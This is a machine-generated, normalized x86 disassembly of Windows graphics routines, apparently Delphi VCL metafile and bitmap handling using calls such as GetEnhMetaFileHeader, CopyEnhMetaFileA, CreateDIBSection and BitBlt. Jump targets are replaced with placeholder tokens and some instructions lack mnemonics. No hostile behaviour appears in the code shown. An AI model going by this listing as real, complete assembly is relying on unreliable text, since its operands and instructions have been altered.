mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420147
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_420125
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4083d4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c0b0
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043c8
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ee6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42012c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_420180
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41fdbc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4201f4
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4201f4
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4201f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_41fdbc
pop esi
pop ebx
retn
mov eax ebx
call sub_420344
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420230
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_41fdbc
pop esi
pop ebx
retn
mov eax ebx
call sub_420344
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420270
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_41fdbc
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420230
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_420230
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4202e4
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415620
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_420344
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_41fdbc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_420a90
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_420a8c
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_4203c8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_415620
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4204d4
mov edx ebx
mov eax esi
call sub_420448
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_420448
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4204c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415884
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
sub_4204d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402c88
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_415884
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_415884
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4205f6
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41d978
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41e768
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42060f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4205ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_42061c
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_41fdbc
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41d8e8
sub_4206a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_420770
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413d34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42080e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420815
mov eax [ rw-data ]
call sub_413d98
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4207e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_420900
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d520
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4139c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d4c4
test al al
je r-xdata
sub_42081c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413d34
mov esi eax
xor ecx ecx
push ebp
push sub_42088c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413d98
retn
mov edx ebx
mov eax esi
call sub_4139c8
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_420900
sub_420898
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41cfb0
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4208d4
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_420900
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d074
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_420900
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d2b4
xor edx edx
push ebp
push sub_420994
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d6a8
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413d48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d520
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_4209a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d2b4
xor eax eax
push ebp
push sub_420a7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_421cbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_42081c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_421dbc
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d6a8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413cac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d520
retn
sub_420a90
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_40326c
sub_420ab0
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_42081c
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cd80
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_420b0c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41b904
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_42081c
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_42081c
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_420b58
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41e1b4
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_420c07
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_420c14
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_420c60
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42081c
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41da20
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41da20
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_4212ae
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026bc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_420fb8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41d900
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41da20
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41da20
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41da20
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41da20
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42125f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42124e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_42122c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41da20
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_420c14
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41e1b4
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41ce94
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412594
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c1d4
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41ce58
call sub_41c1d4
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41d978
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421233
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41da20
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_421202
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41da20
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026dc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c1d4
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41ce58
call sub_41c1d4
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
